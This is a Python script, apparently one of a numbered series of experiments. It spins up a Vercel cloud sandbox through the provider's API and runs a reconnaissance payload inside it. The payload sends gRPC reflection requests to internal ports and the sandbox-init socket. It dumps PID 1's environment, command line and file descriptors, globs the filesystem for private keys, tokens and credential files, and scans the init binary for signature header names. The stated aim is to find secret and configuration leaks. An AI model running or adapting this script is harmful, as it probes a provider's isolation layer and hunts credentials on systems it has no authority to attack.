# 实验J44: curl gRPC 帧请求 + sandbox-init 密钥/配置泄露侦察
# 目标: 打通 gRPC 调用, 找私钥/配置泄露面
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj44"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import socket, re, os, subprocess, glob

print("===== [1] curl gRPC (带端口修正) =====", flush=True)
# gRPC reflection list_services="*": 5字节前缀 + proto(0x1A 0x01 0x2A)
body = b"\x00\x00\x00\x00\x03\x1a\x01*"
with open("/tmp/grpc_body", "wb") as f:
    f.write(body)
for port in [23456, 30001]:
    for host in ["localhost:%d" % port, "[::1]:%d" % port]:
        cmd = ["curl", "-sS", "--http2-prior-knowledge", "--max-time", "6",
               "-i", "-X", "POST", "-H", "content-type: application/grpc",
               "--data-binary", "@/tmp/grpc_body",
               "http://%s/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo" % host]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            print("%s RC=%d\n  out=%r\n  err=%r" % (host, r.returncode, r.stdout[:500], r.stderr[:300]), flush=True)
        except Exception as e:
            print("%s ERR %s" % (host, e), flush=True)

print("===== [2] curl gRPC -> init.sock =====", flush=True)
cmd = ["curl", "-sS", "--http2-prior-knowledge", "--max-time", "6",
       "--unix-socket", "/run/vercel/share/init.sock", "-i", "-X", "POST",
       "-H", "content-type: application/grpc", "--data-binary", "@/tmp/grpc_body",
       "http://localhost/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo"]
r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
print("init.sock RC=%d\n  out=%r\n  err=%r" % (r.returncode, r.stdout[:500], r.stderr[:300]), flush=True)

print("===== [3] sandbox-init 进程配置泄露 =====", flush=True)
print("--- environ ---", flush=True)
try:
    print(open("/proc/1/environ").read().replace("\x00", "\n"), flush=True)
except Exception as e:
    print("ERR", e, flush=True)
print("--- cmdline ---", flush=True)
try:
    print(open("/proc/1/cmdline").read().replace("\x00", " "), flush=True)
except Exception as e:
    print("ERR", e, flush=True)
print("--- fd list ---", flush=True)
try:
    print(os.listdir("/proc/1/fd"), flush=True)
except Exception as e:
    print("ERR", e, flush=True)
print("--- cwd ---", flush=True)
try:
    print(os.readlink("/proc/1/cwd"), flush=True)
except Exception as e:
    print("ERR", e, flush=True)
print("--- exe ---", flush=True)
try:
    print(os.readlink("/proc/1/exe"), flush=True)
except Exception as e:
    print("ERR", e, flush=True)

print("===== [4] rootfs 私钥/密钥文件搜索 =====", flush=True)
hits = []
for pat in ["*.key", "*.pem", "*.priv", "*.secret", "*.token", "id_ed25519*", "*.sig",
            "*private*", "*credential*", "*secret*"]:
    for fp in glob.glob("/**/" + pat, recursive=True):
        if any(x in fp for x in ["/usr/", "/lib", "/proc", "/sys", "/etc/ssl", "/share/doc",
                                 "/python3", "/curl", "/openssl"]):
            continue
        hits.append(fp)
for fp in sorted(set(hits))[:60]:
    try:
        sz = os.path.getsize(fp)
        print("%s (%d bytes)" % (fp, sz), flush=True)
    except Exception:
        print(fp, flush=True)
print("total hits:", len(set(hits)), flush=True)

print("===== [5] 签名头名确认 =====", flush=True)
b = open("/run/vercel/share/sandbox-init", "rb").read()
# 找 signature/timestamp 附近的字符串
for m in re.finditer(rb"signature", b):
    s, e = max(0, m.start()-100), min(len(b), m.end()+100)
    ctx = b[s:e]
    if all(32 <= c < 127 or c in (10, 13, 9) for c in ctx):
        print("@%d: %r" % (m.start(), ctx.decode('latin1')), flush=True)
# 找 x- 前缀头
for m in re.finditer(rb"x-[a-z0-9-]{3,30}", b):
    v = m.group(0)
    if v not in (b"x-content-type-options", b"x-gzip", b"x-www-form-urlencoded",
                 b"x-frame-options", b"x-forwarded-for", b"x-request-id", b"x-powered-by",
                 b"x-idc", b"x-masque", b"x509", b"x-ecdh"):
        print("HEADER: %r" % v.decode('latin1'), flush=True)
'''
run_cmd(sid, SCAN, "curl-grpc-keyleak", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
